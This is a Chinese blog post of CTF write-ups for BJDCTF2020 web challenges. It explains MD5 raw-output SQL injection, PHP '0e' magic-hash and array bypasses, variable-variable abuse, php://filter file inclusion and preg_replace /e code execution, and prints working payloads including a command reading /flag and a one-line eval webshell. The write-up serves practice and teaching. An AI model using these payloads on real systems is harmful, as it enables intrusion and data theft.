<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/author.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/author.jpg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="在buuoj上面复现的wp，有一些是自己做出来的，有一些是看了wp才做出来了，依然很菜。">
<meta property="og:type" content="article">
<meta property="og:title" content="BJDCTF2020">
<meta property="og:url" content="http://example.com/2020/09/28/BJDCTF2020/index.html">
<meta property="og:site_name" content="k1te&#39;s blog">
<meta property="og:description" content="在buuoj上面复现的wp，有一些是自己做出来的，有一些是看了wp才做出来了，依然很菜。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20200928144459500.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20200928150534381.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20200928151554272.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20200928153644111.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20200928164219666.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20200929161506252.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20200929162248790.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20200929170242835.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20200929181134817.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20200929211713316.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20200929211756697.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201004165154451.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201004165223729.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201004171037689.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201004171201673.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_r.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201004222013695.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201004221654162.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201004223440325.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201004223456332.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201009192644228.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201009195949155.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201009204957520.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201009205507311.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201010111707519.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201010114813584.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201010155027164.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201010160637448.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201010161925745.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201010164915050.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201011110916069.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201011112628470.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201229175242935.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201229175533298.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20201229181102775.png">
<meta property="article:published_time" content="2020-09-28T06:42:08.000Z">
<meta property="article:modified_time" content="2021-01-28T15:48:41.740Z">
<meta property="article:author" content="K1te">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zk1te/img/main/image-20200928144459500.png">

<link rel="canonical" href="http://example.com/2020/09/28/BJDCTF2020/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>BJDCTF2020 | k1te's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">k1te's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/28/BJDCTF2020/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="K1te">
      <meta itemprop="description" content="看到我请叫我滚去学web">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="k1te's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          BJDCTF2020
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-09-28 14:42:08" itemprop="dateCreated datePublished" datetime="2020-09-28T14:42:08+08:00">2020-09-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-01-28 23:48:41" itemprop="dateModified" datetime="2021-01-28T23:48:41+08:00">2021-01-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">题解</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>在buuoj上面复现的wp，有一些是自己做出来的，有一些是看了wp才做出来了，依然很菜。</p>
<a id="more"></a>

<h2 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h2><p>打开网址之后，在响应标头中找到了hint：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20200928144459500.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password &#x3D; md5($pass,true)</span><br></pre></td></tr></table></figure>
<p>理论上md5的密码验证是很难破解的，但是这里MD5函数的第二个参数设为true就有漏洞。</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20200928150534381.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&gt;&gt;<span class="number">5</span>d41402abc4b2a76b9719d911017c592</span><br><span class="line">md5(<span class="string">&quot;hello&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">&gt;&gt;]A@*�K*v�q��Œ</span><br></pre></td></tr></table></figure>
<p>32字符十六进制数很好理解，16进制字符二进制格式并非真的二进制，二十将十六进制数两个一组，转化成ASCII字符，如，5d =》<code>]</code>,41=&gt;<code>A</code></p>
<p>因此可以输入特定的字符串，使得md5之后的raw_output中含有<code>or</code>。网上找到了两个：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">&quot;ffifdyop&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">&gt;&gt;<span class="string">&#x27;or&#x27;</span><span class="number">6</span>�]��!r,��b</span><br><span class="line">md5(<span class="string">&quot;129581926211651571912466741651878684928&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">&gt;&gt;�T0D��o<span class="comment">#��&#x27;or&#x27;8</span></span><br><span class="line"><span class="comment">//第二个在该题中无效</span></span><br></pre></td></tr></table></figure>
<p>第二层是MD5碰撞：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20200928151554272.png"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET[&#x27;a&#x27;];</span></span><br><span class="line"><span class="comment">$b = $_GET[&#x27;b&#x27;];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
<p>因为使用的是<code>!=</code>和<code>==</code>弱类型比较而不是<code>！==</code>和<code>===</code>这种强类型比较，弱类型比较会将‘0E’开头的哈希值解释为科学计数法，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>符合条件的一些MD5值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">纯数字类：</span><br><span class="line"> </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">大写字母类：</span><br><span class="line">QLTHNDT</span><br><span class="line">0e405967825401955372549139051580</span><br><span class="line"> </span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"> </span><br><span class="line">EEIZDOI</span><br><span class="line">0e782601363539291779881938479162</span><br><span class="line"> </span><br><span class="line">TUFEPMC</span><br><span class="line">0e839407194569345277863905212547</span><br><span class="line"> </span><br><span class="line">UTIPEZQ</span><br><span class="line">0e382098788231234954670291303879</span><br><span class="line"> </span><br><span class="line">UYXFLOI</span><br><span class="line">0e552539585246568817348686838809</span><br><span class="line"> </span><br><span class="line">IHKFRNS</span><br><span class="line">0e256160682445802696926137988570</span><br><span class="line"> </span><br><span class="line">PJNPDWY</span><br><span class="line">0e291529052894702774557631701704</span><br><span class="line"> </span><br><span class="line">ABJIHVY</span><br><span class="line">0e755264355178451322893275696586</span><br><span class="line"> </span><br><span class="line">DQWRASX</span><br><span class="line">0e742373665639232907775599582643</span><br><span class="line"> </span><br><span class="line">DYAXWCA</span><br><span class="line">0e424759758842488633464374063001</span><br><span class="line"> </span><br><span class="line">GEGHBXL</span><br><span class="line">0e248776895502908863709684713578</span><br><span class="line"> </span><br><span class="line">GGHMVOE</span><br><span class="line">0e362766013028313274586933780773</span><br><span class="line"> </span><br><span class="line">GZECLQZ</span><br><span class="line">0e537612333747236407713628225676</span><br><span class="line"> </span><br><span class="line">NWWKITQ</span><br><span class="line">0e763082070976038347657360817689</span><br><span class="line"> </span><br><span class="line">NOOPCJF</span><br><span class="line">0e818888003657176127862245791911</span><br><span class="line"> </span><br><span class="line">MAUXXQC</span><br><span class="line">0e478478466848439040434801845361</span><br><span class="line"> </span><br><span class="line">MMHUWUV</span><br><span class="line">0e701732711630150438129209816536</span><br></pre></td></tr></table></figure>
<p>然后是第三层：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20200928153644111.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>第三层可以用数组绕过，由于：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>[] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> md5(<span class="variable">$a</span>) === <span class="literal">null</span>;</span><br><span class="line">&gt;&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>故：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20200928164219666.png"></p>
<h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><p>这道题看了很久，刚看到message以及get的时候觉得是xss，但是搞不定，然后去看wp，发现是git源码泄露，然而buu的web用dirsearch扫描的时候永远是429-Too Many Requests…….</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20200929161506252.png" alt="啥也扫不出来"></p>
<p>知道是git源码泄露之后用githack下载：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20200929162248790.png"></p>
<p>index.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<p>这个可变变量把我给绕晕了。。。可以看看<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/824.html#Mark_loves_cat">Y1ng大佬的wp</a></p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20200929170242835.png"></p>
<h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><p>看了看题目，应该是zjctf某道题的改编，首先找到zjctf的题目。</p>
<p>第一层是一样的，使用data://绕过。payload：</p>
<p><code>?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=</code></p>
<p>接着看到include函数想到文件包含。</p>
<p>payload：<code>?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20200929181134817.png"></p>
<p>将base64解码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>刚开始发现getFlag函数定义了没有执行，猜测是使用complex函数来执行这个函数，但是看了好久还是没思路。。。</p>
<p>然后看了wp才知道preg_replace在/e模式下的RCE</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></p>
<p>payload：<code>?\S*=$&#123;getflag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
<p>当然，都RCE了，也可以一句话木马直接上蚁剑</p>
<p><code>?\S*=$&#123;eval($_POST[kite])&#125;</code></p>
